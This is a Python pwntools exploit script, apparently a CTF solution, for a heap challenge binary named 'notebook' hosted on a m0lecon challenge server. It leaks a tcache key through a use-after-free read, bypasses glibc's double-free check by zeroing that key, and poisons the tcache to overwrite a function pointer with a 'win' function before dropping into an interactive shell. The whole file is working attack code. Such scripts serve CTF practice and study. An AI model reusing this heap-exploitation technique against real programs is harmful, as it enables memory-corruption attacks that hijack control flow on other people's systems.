#!/usr/bin/env python3
from pwn import *

if args.LOCAL:
    elf = ELF('./notebook_patched', checksec=False)
else: 
    elf = ELF('./notebook',checksec=False)

context.binary = elf

libc = ELF('./libc.so.6', checksec=False)

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote('offsec.m0lecon.it',13568)
    return r

p=conn()
global_handler = elf.sym['global_handler']
log.info(f'global_handler address: {global_handler:#x}')
win_addr = elf.sym['win']

def create(idx,data=b'A'*0x60):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

def edit(idx,data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ', data)

def show(idx):
    p.sendlineafter(b'> ',b'4')
    p.sendlineafter(b'index: ',str(idx).encode())
    return p.recvline()

def trigger():
    p.sendlineafter(b'> ',b'5')

def main():
    ''' ---tcache poisoning--- '''
    create(0)
    free(0)
    r = show(0).strip()
    ld = u64(r[:8])             #it should be NULL
    key = u64(r[8:])
    log.info(f'ld value: {ld:#x}; key value: {key:#x}')

    #double free bypass
    edit(0,b'\x00'*16)
    free(0)

    #double free exploitation
    edit(0,p64(global_handler))
    create(0)
    create(1,p64(win_addr))                   #points to global_handler
    trigger()

    p.interactive()
    

if __name__ == "__main__":
    main()